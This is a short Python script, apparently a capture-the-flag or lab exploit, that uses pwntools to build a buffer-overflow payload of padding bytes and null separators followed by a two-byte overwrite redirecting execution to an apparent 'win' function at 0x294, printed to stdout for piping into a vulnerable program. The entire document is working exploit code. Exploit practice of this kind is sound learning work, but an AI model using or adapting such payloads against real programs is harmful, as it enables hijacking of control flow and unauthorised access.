import sys
from pwn import *
payload = b"A" * 30
payload += b"\x00"
payload += b"B" * 30
payload += b"\x00"
payload += b"C" * 9
payload += b"\x00"
#for i in range(200)
win = p16(0x294)
payload += win
sys.stdout.buffer.write(payload)
